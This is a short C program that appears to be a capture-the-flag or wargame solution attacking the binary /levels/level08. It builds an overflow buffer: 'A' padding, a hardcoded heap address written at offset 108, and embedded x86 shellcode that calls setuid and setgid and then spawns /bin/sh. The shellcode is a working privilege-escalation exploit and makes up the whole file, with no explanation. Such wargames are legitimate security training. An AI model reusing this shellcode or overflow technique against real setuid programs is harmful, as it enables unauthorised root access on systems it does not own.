#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define OFFSET 108
#define HEAP_OFFSET 0x804a00c

char shellcode[] =  "\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xd2\x6a"
                    "\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52"
                    "\x53\x89\xe1\xcd\x80";

int main(int ac, char *av[]) {
    char buf[OFFSET + 4 + 1];
    unsigned long sp = HEAP_OFFSET;
    unsigned long sp2 = sp + 4;

    memset(&buf,'A',sizeof(buf)-1);

    memcpy(&buf[OFFSET],&sp,4);
    memcpy(&buf[0],&sp2,4);
    memcpy(&buf[4],&shellcode,strlen(shellcode));

    buf[OFFSET+4] = 0;

    execl("/levels/level08","level08",buf,0);

    return 0;
}
